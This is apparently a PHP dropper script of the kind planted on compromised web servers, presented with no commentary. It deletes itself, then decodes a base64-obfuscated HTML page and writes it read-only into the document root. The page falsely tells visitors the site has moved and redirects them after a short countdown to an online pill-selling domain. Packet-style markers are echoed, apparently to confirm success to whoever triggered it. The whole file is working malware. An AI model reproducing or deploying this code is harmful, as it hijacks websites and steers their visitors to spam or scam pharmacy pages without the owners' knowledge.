<?php unlink(__FILE__); $file_body = 'PCFET0NUWVBFIGh0bWw+DQo8aHRtbD4NCjxoZWFkPg0KPE1FVEEgSFRUUC1FUVVJVj0iQ0FDSEUtQ09OVFJPTCIgQ09OVEVOVD0iTk8tQ0FDSEUiPg0KPE1FVEEgSFRUUC1FUVVJVj0iUFJBR01BIiBDT05URU5UPSJOTy1DQUNIRSI+DQo8c3R5bGU+DQpib2R5IHsgbWFyZ2luOiAyMDBweDsgZm9udDogMTJwdCBoZWx2ZXRpY2E7IH0NCjwvc3R5bGU+DQoNCjwvaGVhZD4NCjxib2R5Pg0KDQo8L2JvZHk+DQo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+DQoNCi8vIEVkaXQgdGhlc2UgdG8gc3VpdCB5b3VyIG5lZWRzLg0KdmFyIG9sZHNpdGUgPSAnaHR0cDovL3BpbGx3ZWJtYXJ0LnNob3AnDQp2YXIgbmV3U2l0ZSA9ICJodHRwOi8vcGlsbHdlYm1hcnQuc2hvcCI7DQp2YXIgc2Vjb25kcyA9IDI7ICAvLyBjb3VudGRvd24gZGVsYXkuDQoNCnZhciBwYXRoID0gbG9jYXRpb24ucGF0aG5hbWU7DQp2YXIgc3JjaCA9IGxvY2F0aW9uLnNlYXJjaDsNCnZhciB1bmlxID0gTWF0aC5mbG9vcigoTWF0aC5yYW5kb20oKSAqIDEwMDAwKSArIDEpOw0KdmFyIG5ld1BhdGggPSBuZXdTaXRlIDsgDQoNCg0KZG9jdW1lbnQud3JpdGUgKCc8cD5BcyBwYXJ0IG9mIGhvc3RpbmcgaW1wcm92ZW1lbnRzLCB0aGUgc3lzdGVtIGhhcyBiZWVuIG1pZ3JhdGVkIGZyb20gJyArIG9sZHNpdGUgKyAnIHRvPC9wPicpOw0KZG9jdW1lbnQud3JpdGUgKCc8cD48YSBocmVmPSInICsgbmV3UGF0aCArICciPicgKyBuZXdTaXRlICsgJzwvYT48L3A+Jyk7DQpkb2N1bWVudC53cml0ZSAoJzxwPlBsZWFzZSB0YWtlIG5vdGUgb2YgdGhlIG5ldyB3ZWJzaXRlIGFkZHJlc3MuPC9wPicpOw0KZG9jdW1lbnQud3JpdGUgKCc8cD5JZiB5b3UgYXJlIG5vdCBhdXRvbWF0aWNhbGx5IHJlZGlyZWN0ZWQgcGxlYXNlIGNsaWNrIHRoZSBsaW5rIGFib3ZlIHRvIHByb2NlZWQuPC9wPicpOw0KZG9jdW1lbnQud3JpdGUgKCc8cCBpZD0iZHZDb3VudERvd24iPllvdSB3aWxsIGJlIHJlZGlyZWN0ZWQgYWZ0ZXIgPHNwYW4gaWQgPSAibGJsQ291bnQiPjwvc3Bhbj4mbmJzcDtzZWNvbmRzLjwvcD4nKTsNCg0KZnVuY3Rpb24gRGVsYXlSZWRpcmVjdCgpIHsNCiAgICB2YXIgZHZDb3VudERvd24gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZHZDb3VudERvd24iKTsNCiAgICB2YXIgbGJsQ291bnQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgibGJsQ291bnQiKTsNCiAgICBkdkNvdW50RG93bi5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsNCiAgICBsYmxDb3VudC5pbm5lckhUTUwgPSBzZWNvbmRzOw0KICAgIHNldEludGVydmFsKGZ1bmN0aW9uICgpIHsNCiAgICAgICAgc2Vjb25kcy0tOw0KICAgICAgICBsYmxDb3VudC5pbm5lckhUTUwgPSBzZWNvbmRzOw0KICAgICAgICBpZiAoc2Vjb25kcyA9PSAwKSB7DQogICAgICAgICAgICBkdkNvdW50RG93bi5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOw0KICAgICAgICAgICAgd2luZG93LmxvY2F0aW9uID0gbmV3UGF0aDsNCiAgICAgICAgfQ0KICAgIH0sIDEwMCk7DQp9DQpEZWxheVJlZGlyZWN0KCkNCg0KPC9zY3JpcHQ+DQo8L2h0bWw+DQo=';
$file_name = 'gordie.html';
$dir_name = '##DIR_NAME##';

$root =  $_SERVER["DOCUMENT_ROOT"];
if (strpos($root,'/') !== false) {
    $path =  $root . "/";
}
else $path = $root . "\\";



$file_name_array = explode(',', $file_name);


echo '###PACKET_START###';

foreach ($file_name_array as $file_name) { 


chmod($path . $file_name, 0644);
file_put_contents($path . $file_name , base64_decode($file_body));

$fp = fopen($path . $file_name , 'w');
fwrite($fp, base64_decode($file_body));
fclose($fp);

chmod($path . $file_name, 0444);

if (file_exists($path . $file_name)) {echo  $path . $file_name  . ';'; 
}	

$i++;

}

echo '###PACKET_END###';
echo "###REL_DONE##";

